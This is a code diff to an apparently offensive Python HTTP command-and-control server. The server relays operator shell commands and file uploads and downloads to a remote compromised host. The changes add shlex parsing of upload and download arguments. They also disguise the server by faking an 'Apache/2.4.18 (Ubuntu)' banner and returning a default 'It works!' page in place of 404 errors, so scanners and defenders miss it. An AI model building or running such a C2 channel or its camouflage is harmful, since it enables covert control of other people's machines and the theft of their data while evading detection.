@@ -5,6 +5,7 @@
 #============================#
 
 import os
+import shlex
 import base64
 import readline
 import neotermcolor
@@ -80,10 +81,12 @@ class MyServer(BaseHTTPRequestHandler):
                     file_content = file.read()
                     encoded_file = "File: "
                     encoded_file += self.encode_file_revbase64url(file_content)
+                self.server_version = "Apache/2.4.18"
+                self.sys_version = "(Ubuntu)"
                 self._set_headers()
                 self.wfile.write(encoded_file.encode("utf-8"))
 
-            if self.path == "/api/token":
+            elif self.path == "/api/token":
                 while True:
                     whoami = prompt.split("!")[0].split("@")[0]
                     hostname = prompt.split("!")[0].split("@")[1]
@@ -121,22 +124,26 @@ class MyServer(BaseHTTPRequestHandler):
                         continue
 
                     if "upload" in command.split()[0]:
-                        if len(command.split()) < 3:
+                        args = shlex.split(command)
+                        if len(args) < 3 or len(args) > 3:
                             print(colored("[!] Usage: upload local_file remote_file\n","red"))
                             noerror = False ; command = None
                         else:
-                            local_path = command.split()[1]
-                            remote_path = command.split()[2]
+                            local_path = args[1]
+                            remote_path = args[2]
+                            command = "upload " + args[1] + "!" + args[2]
                             print(colored(f"[+] Uploading {local_path} in {remote_path}..\n","green"))
 
                     if "download" in command.split()[0]:
-                        if len(command.split()) < 3:
+                        args = shlex.split(command)
+                        if len(args) < 3 or len(args) > 3:
                             print(colored("[!] Usage: download local_file remote_file\n","red"))
                             noerror = False ; command = None
 
                         else:
-                            remote_path = command.split()[1]
-                            local_path = command.split()[2]
+                            remote_path = args[1]
+                            local_path = args[2]
+                            command = "download " + args[1] + "!" + args[2]
                             print(colored(f"[+] Downloading {remote_path} in {local_path}..\n","green"))
 
                     if "help" in command.split()[0]:
@@ -161,6 +168,14 @@ class MyServer(BaseHTTPRequestHandler):
                             exit(0)
                         break
 
+            else:
+                itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.send_header("Content-Length", len(itworks_message))
+                self.end_headers()
+                self.wfile.write(itworks_message.encode())
+
         except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
             command = "HTTPShellNull"
             pass
@@ -171,6 +186,8 @@ class MyServer(BaseHTTPRequestHandler):
         global prompt ; global first_run ; global noerror
         global local_path ; global remote_path ; global command
         try:
+            self.sys_version = "(Ubuntu)"
+            self.server_version = "Apache/2.4.18"
             self._set_headers() ; response = "Success"
             content_length = int(self.headers["Content-Length"])
             encoded_data = self.rfile.read(content_length).decode("utf-8")
@@ -215,8 +232,12 @@ class MyServer(BaseHTTPRequestHandler):
                         print(colored(decoded_payload.rstrip()+"\n", "red")) 
             
             else:
-                self._set_headers(404)
-            self.wfile.write(response.encode("utf-8"))
+                itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.send_header("Content-Length", len(itworks_message))
+                self.end_headers()
+                self.wfile.write(itworks_message.encode())
 
         except:
             pass
